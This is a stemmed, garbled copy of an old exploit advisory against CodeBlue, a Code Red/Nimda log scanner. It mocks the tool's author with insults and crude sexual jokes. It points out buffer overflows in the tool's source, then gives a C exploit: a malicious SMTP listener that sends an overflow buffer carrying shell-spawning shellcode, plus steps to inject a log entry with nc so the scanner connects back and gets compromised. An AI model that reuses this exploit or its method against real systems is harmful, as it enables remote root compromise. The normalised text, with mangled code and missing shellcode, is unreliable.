 titl potenti remot root in codeblu log scanner name demi sex god from hell adv number date yes pleas mail me if you are femal (send pictures) crazi track number that make it look like i have some massiv databas of juarez number prop to email inform ----------- you may rememb me from sweati night of passion or perhap from yesterday when i announc the releas of a piec of softwar i wrote (mani year ago too btw) in general i receiv no feedback from this cept from one guy have problem download it (howd that go btw?) and then this from "michael" to "'demi sex god from hell'" subject re ass the attack spoof shell annoy pointless well how veri veri rude that realli was uncal for (propz to dme yo!) gay bi or curious i went to find out more about mystic michael who is obvious veri import as he is the onli one who felt the need to tell me they didnt like me it turn out hes a bit of programm with some code avail on his websit (www.tenebrous.com) i got codeblu (btw mystic mike your auto-download script for you counter give me a number error) a log check util mystic mike wrote and releas under the gnu gpl to make the world a better place if this tool is run as root (say night from root crontab) there is a potenti remot root in ani case regardless of user there is alway a remot if codeblu is local suid there mani overflow all throughout it easi peasi like the girl in st patricks!!! note st patrick is a great place in sydney playground of the rich and famous visit it if you ever visit sydney tell them i sent you so let have a walk through the code and get a feel for mystic mike the man behind the mystic (do you wear a crazi robe with a hood like a monk mike?) dollar cd codeblu dollar ls chang copi makefil readm codeblue.c dollar head copi gnu general public licens version number june number copyright (c) number number free softwar foundat inc number templ place suit number boston ma number usa everyon is permit to copi and distribut verbatim copi of this licens document but chang it is not allow preambl /* uh-oh */ dollar vi codeblue.c /* * dollar /usr/src/projects/codeblue/codeblue.c,v number number number * root exp root dollar * ****************************************************************************************** * -[ g o d b l e s s a m e r i c a ]- * ****************************************************************************************** * * codeblu number by michael email * this softwar is freeli distribut under the term of the gnu/gpl * pleas see file copi /* god bless america and mystic mike */ ... /* line number */ /* * siginal_init * set up all the signal we'd like * to handl special */ void signal_init(void) { struct sigact sa_old sa_new /* signal handl */ sa_new.sa_handl = signal_handl sigemptyset(&sa_new.sa_mask) sa_new.sa_flag = number sigaction(sigint &sa_new &sa_old) sigaction(sigpip &sa_new &sa_old) } /* share signal handler do all sort of stuff not veri good mike :( */ /* line number */ /********************************************************************* * our close() wrapper */ int close(int sd) { return (close(sd)) } /* that just made me laugh */ /* line number */ char number /* loglin is global */ int scan_file(fil * fp) { char number ... fgets(buff number fp) ... if (found_infect == number { /* if it pick up a worm entri in the */ /* log this is true */ strcpy(loglin buffer) /* oh dear */ /* line number */ char number /* global */ char number = "/usr/bin/whois" /* global */ int main(int argc char **argv) { .... if number == -') switch number { case e':{ /* return email address */ if ((!argv[i + number  (argv[i + number == -')) diewithrequire(argv[i]) strcpy(repli argv[i + number break } case p':{ /* path to whoi binari */ if ((!argv[i + number  (argv[i + number == -')) diewithrequire(argv[i]) strcpy(whoispath argv[i + number break } /* whoop */ now all this is good for a laugh but unless it suid not much use :( codeblu will scan apache/squid logfil look for code red and nimda log hit if it find a hit it will connect to the sourc ip adress of the hit and send an email warn of infect unfortun mystic mike was too far up on his high hors to write someth decent the function that doe this is send_email() (line number it start off like this int send_email(void) { int sd char *host = malloc(sizeof(char) * number /* ... silli crap use popen and stuff ... */ /* host is the infect host from the logfil * this will connect to the host on port number */ if ((sd = smtp_connect(host))  success) return number /* step number - get initi server respons */ get_smtp_reply(sd) /* this is the function of interest */ /* line number */ /********************************************************************* * fetch a repli from the smtp server */ int get_smtp_reply(int sd) { char number /* this is the remot host mail server buf */ ... /* * we'll loop infin receiv * number byte at a time until we receiv a carriag return * or line-fe charact signifi the end of the output */ /* gee that sound like a good idea mystic email */ ... while (true) { if (select((sd + number &rset null null &tv)  number { if (errno != einprogress) { fprintf(stderr "[ error select() fail percent strerror(errno)) return number } } if (recv(sd (int *) &response[i] number recv_fl)  number { /* hello */ if (errno == eagain) { if (elaps  smtp_timeout) { fprintf(stderr "[ error oper time out\n") fprintf(log ".... error oper time out\n") return number } elapsed++ usleep(smtp_timeout * number continu } els { if (!(flag & fl_bequiet)) fprintf(stderr "[ error recv() fail percent strerror(errno)) fprintf(log ".... error recv() fail percent strerror(errno)) return number } } if ((response[i] == \n')  ((response[i] == \n') && (response[i + number == \n'))) break i++ /* come here often babi */ } so slowli but sure respons is overrun unless it it a newlin /* * hi this is an exploit that doesnt work it should be enough of a point in * the right direct though the overflow is in get_smtp_reply() codeblue.c * is pretti damn poor there are more!! * * be in a funni mood one afternoon i made some softwar public * avail the next morn i see this in my mailbox * * ------- begin spout off ------ * from email mon jul number number number * return-path * delivered-to email * receiv (qmail number invok from network) number jul number number number * receiv from number (helo number * number * by orbital.wiretapped.net with smtp number jul number number number * receiv from michael number by number * (intermail number number with esmtp * id email * for  mon number jul number number number * from "michael" * to "'demi sex god from hell'" * subject re ass the attack spoof shell * date mon number jul number number number * message-id email * mime-vers number * content-typ text/plain * charset="us-ascii" * content-transfer-encod number * x-prioriti number (normal) * x-msmail-prior normal * x-mailer microsoft outlook build number * import normal * x-mimeol produc by microsoft mimeol number * in-reply-to * status ro * * annoy pointless * * ------- end spout off ------- * * how email * * so i had a visit to www.tenebrous.com found some softwar written by this * master coder and here we are now * * to use this against a webserv (a) use codeblu * * dollar printf "get /scripts/root.exe\r\n\r\n"  nc a number * * this will add an entri in the access log * * on the same host * * # ./mystic_anus number * * wait a while * * when codeblu run it will pull your ip from the log connect to your port * number and tri to send you a mail becaus mystic is an idiot you will get a * shell with the openbsd code!! * * i like exclam mark !!! * * krad haxxor prop dedmunk (happi email number caddi buo solac * everyon on #cw  everyon in pari (you have a love citi i had a love * time last weekend thankyou!!!) dedmunk everyon at netcraft (esp mike * hi!) everyon in sydney dedmunk everyon i go drink with anyon who * live in london marlinspik (yo!) the woman who sell me my cigarett in * the morn on the way into work thoma green dedmunk adam durab number * * big shout out to toliman and zero sum understand! * * propz to email * * dont forget * * dollar /usr/src/projects/codeblue/codeblue.c,v number number number root exp root dollar * ****************************************************************************************** * -[ g o d b l e s s a m e r i c a ]- * ****************************************************************************************** * */ #includ  #includ  #includ  #includ  #includ  #includ  #includ  #includ  #includ  #defin of number /* this is bigger than need */ /* optim the code now it work better in bad situat */ /* i dont know who wrote this sorri if you wrote it let me know */ char lunix_shellcode[]= number number number number number number number number /* shell on port number shellcod for openbsd by noir */ long bsd_shellcode[]= { number number number number number number number number number number } int main(int argc char *argv[]) { struct sockaddr_in sock_in struct sockaddr_in sock_out char *port = number int fd a int len int opt char bigbuf[of] char *p long lunix_resp = number long bsd_resp = number char *moo = number " long resp = lunix_resp char *shellcod = lunix_shellcod printf("strlen scode = percent strlen(shellcode)) if (argc == number port = number if (argc  number { fprintf(stderr "useg percent [port]\n" number number } resp += number p = bigbuf memcpy(p moo number p += number memset(p number number - strlen(shellcode)) p += number - strlen(shellcode) memcpy(p shellcod strlen(shellcode)) p += strlen(shellcode) memcpy(p &resp number p += number memcpy(p &resp number p += number memset(p \n number if ((fd = socket(pf_inet sock_stream number  number perror("socket") number } memset(&sock_in number sizeof(sock_in)) sock_in.sin_famili = af_inet sock_in.sin_port = htons(atoi(port)) sock_in.sin_addr.s_addr = inaddr_ani len = sizeof(sock_in) opt = number if (setsockopt(fd sol_socket so_reuseaddr &opt sizeof(int)) == number { perror("setsockopt") number } if (bind(fd (struct sockaddr *)&sock_in len)  number { perror("bind") number } if (listen(fd number  number { perror("listen") number } printf("listen on port percent atoi(port)) for (;;) { len = sizeof(sock_out) if ((a = accept(fd (struct sockaddr *)&sock_out &len))  number perror("accept") number } printf("got a connect from percent inet_ntoa(sock_out.sin_addr)) fflush(stdout) write(a bigbuf sizeof(bigbuf)) close(a) } number }